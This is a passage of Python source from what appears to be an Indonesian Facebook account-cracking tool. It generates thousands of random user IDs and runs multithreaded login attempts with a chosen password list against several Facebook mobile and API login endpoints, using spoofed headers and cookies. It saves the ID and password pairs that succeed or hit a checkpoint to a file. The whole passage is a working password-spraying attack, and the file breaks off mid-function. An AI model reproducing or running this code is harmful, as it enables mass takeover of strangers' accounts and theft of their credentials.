				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run898(self):
		x = 111111111
		xx = 999999999
		idx = "8"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run798(self):
		x = 111111111
		xx = 999999999
		idx = "7"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run698(self):
		x = 111111111
		xx = 999999999
		idx = "6"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run598(self):
		x = 111111111
		xx = 999999999
		idx = "5"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run498(self):
		x = 111111111
		xx = 999999999
		idx = "4"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run398(self):
		x = 111111111
		xx = 999999999
		idx = "3"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def run298(self):
		x = 111111111
		xx = 999999999
		idx = "2"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.bapi4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def bapi4(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r %s[OK] %s <─> %s %s•%s 2006%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r %s[CP] %s <─> %s %s•%s 2006%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
			
	def pilihmetod3(self):
		print("")
		print("%s [1] 2007-08 + Cloning + methode mbasic"%(P))
		print(" %s[2] 2007-08 + Cloning + methode bapi"%(P))
		print("%s [3] 2007-08 + Cloning + methode free"%(P))
		print(" %s[4] 2007-08 + Cloning + methode touch"%(P))
		print("%s [5] 2007-08 + Cloning + methode mobile"%(P))
		print(" %s[6] 2007-08 + Cloning + methode IPhone"%(P))
		print("%s [7] 2007-08 + Cloning + methode x facebook"%(P))
		print(" %s[8] 2007-08 + Cloning + methode graph [ %sTidak Ada Pembaruan %s]"%(P,M,P))
		Mat =input(" %sChoose : "%(P))
		if Mat in ["1", "01"]:
			self.old_basic3()
		if Mat in ["2", "02"]:
			self.old_bapi3()
		if Mat in ["3", "03"]:
			self.old_free3()
		if Mat in ["4", "04"]:
			self.old_touch3()
		if Mat in ["5", "05"]:
			self.old_mobile3()
		if Mat in ["6", "06"]:
			self.old_iphone3()
		if Mat in ["7", "07"]:
			self.old_xfacebook3()
		if Mat in ["8", "08"]:
			self.old_graph()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			pilihmetod3()
	
	
	def old_xfacebook3(self):
		x = 1111111
		xx = 9999999
		idx = "10000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook3, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def xfacebook3(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://x.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s \x1b[38;5;231m<─> %s%s %s•%s 2007%s <─> %s2008"%(K,uid,K,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_iphone3(self):
		x = 1111111
		xx = 9999999
		idx = "10000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone3, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def iphone3(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://IPhone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://IPhone.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_mobile3(self):
		x = 1111111
		xx = 9999999
		idx = "10000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.mobile3, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def mobile3(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_touch3(self):
		x = 1111111
		xx = 9999999
		idx = "10000000" 
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.touch3, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def touch3(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
